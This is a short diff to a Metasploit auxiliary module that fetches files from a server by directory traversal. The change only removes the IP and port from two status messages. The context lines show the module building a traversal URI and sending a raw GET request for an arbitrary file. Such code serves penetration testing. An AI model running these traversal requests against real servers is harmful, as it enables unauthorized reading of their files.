@@ -52,14 +52,14 @@ class MetasploitModule < Msf::Auxiliary
     file = file[1, file.length] if file[0, 1] == "\\"
 
     uri = "/#{trav}#{file}"
-    print_status("#{ip}:#{rport} - Retrieving #{file}")
+    print_status("Retrieving #{file}")
 
     res = send_request_raw({
       'method' => 'GET',
       'uri' => uri
     }, 25)
 
-    print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
+    print_status("returns: #{res.code.to_s}")
 
     if res and res.body.empty?
       print_error("No file to download (empty)")
